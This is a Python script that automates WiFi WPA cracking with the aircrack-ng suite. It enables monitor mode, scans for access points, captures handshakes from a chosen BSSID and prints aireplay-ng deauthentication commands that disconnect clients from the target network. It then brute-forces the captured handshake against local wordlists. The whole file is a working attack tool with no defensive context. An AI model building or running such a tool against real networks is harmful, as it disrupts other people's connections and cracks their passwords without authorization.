import os
import time
import subprocess

interface = "wlan0"
fileName = "new"
pwd = os.getcwd()

target_bssid=""
target_channel=1
station="S"

wordlists = sorted([file for file in os.listdir(pwd + "/wordlist") if file.endswith('.txt')])
print(wordlists)

def start_monitor_mode(interface):
    print(f"Starting monitor mode on {interface}")
    os.system(f"sudo airmon-ng start {interface}")
    time.sleep(3)

def stop_monitor_mode(interface):
    print(f"Stopping monitor mode on {interface}")
    os.system(f"sudo airmon-ng stop {interface}mon")

def check_points(interface):
    os.system(f"sudo airodump-ng {interface}mon")

def capture_handshake(interface, bssid, channel):
    os.system(f"sudo airodump-ng --bssid {bssid} -c {channel} -w {fileName} {interface}mon")

def deauth_attack(interface, bssid):
    # print(f"\n\n\n\n***Copy***\n\n\n\n")
    # print(f" sudo aireplay-ng --deauth 30 -a {bssid} -c S wlan0mon")
    # input(f"\n\n***enter")
    # subprocess.Popen(f"sudo aireplay-ng --deauth 30 -a {bssid} {interface}mon", shell=True)
    printCommands(bssid,station)

def crack_password(wordlist):
    print(f"\n \n \n ******************** {wordlist}\n \n \n ")
    os.system(f"sudo aircrack-ng -w {pwd + '/wordlist/' + wordlist} {fileName}-01.cap")

def delete_non_py_files(directory):
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        if os.path.isfile(file_path) and not filename.endswith('.py') and filename != "wordlist"  and filename!=".gitignore":
            try:
                os.remove(file_path)
                print(f"Deleted: {filename}")
            except Exception as e:
                print(f"Failed to delete {filename}: {e}")

def display_menu():
    print("\nMenu:")
    print("0. Delete Files")
    print("1. Check Pints and Capture Handshake")
    print("2. Apply Wordlists")
    print("3. Check Points")
    print("4. Capture Handshake")
    print("6. Print commands to copy")
    print("7. Exit")

def printCommands(bssid,station):
    print(f"\n\n\n\n***Copy***\n\n\n\n")
    print(f" sudo aireplay-ng --deauth 30 -a {bssid} -c {station} wlan0mon")
    print(f"sudo aireplay-ng --deauth 30 -a {bssid} {interface}mon")

    input(f"\n\n***enter")

def main(station,target_bssid,target_channel):
    
    while True:
        display_menu()
        choice = input("Enter your choice: ")
        if choice == "0":
            delete_non_py_files(pwd)
        elif choice == '1':
            check_points(interface)
            target_bssid = input("Enter BSSID: ")
            target_channel = input("Enter channel: ")
            deauth_attack(interface, target_bssid)
            capture_handshake(interface, target_bssid, target_channel)
            station= input("Ente station: ")
        elif choice == '2':
            apply_wordlists()
        elif choice == '3':
            check_points(interface)
            target_bssid = input("Enter BSSID: ")
            target_channel = input("Enter channel: ")
        elif choice == '4':
            capture_handshake(interface, target_bssid, target_channel)
            station= input("Ente station: ")

        elif choice == '6':
            printCommands(target_bssid,station)
        elif choice == '7':
            print("Exiting...")
            break            
        else:
            print("Invalid choice. Please try again.")

def apply_wordlists():
    for wordlist in wordlists:
        crack_password(wordlist)

if __name__ == "__main__":
    start_monitor_mode(interface)
    main(station,target_bssid,target_channel)
    input("\nPress enter to stop monitor mode.")
    stop_monitor_mode(interface)

